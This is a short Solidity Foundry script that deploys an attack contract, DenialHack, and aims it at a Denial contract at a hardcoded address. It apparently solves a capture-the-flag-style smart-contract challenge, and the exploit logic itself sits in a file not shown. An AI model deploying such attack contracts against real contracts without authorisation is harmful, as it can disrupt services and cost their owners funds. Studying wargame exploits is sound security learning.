// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Denial.sol";
import "../src/DenialHack.sol";

contract DenialHackScript is Script {
  Denial public denialContract = Denial(payable(address(0xf745C622DEde108833804314f4e1Dd77c6a9276b)));
  DenialHack public denialHackContract;

  function setUp() public {}

  function run() public {
    uint256 attacker = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(attacker);

    denialHackContract = new DenialHack();
    denialHackContract.setTarget(address(denialContract));
    
    vm.stopBroadcast();
  }
}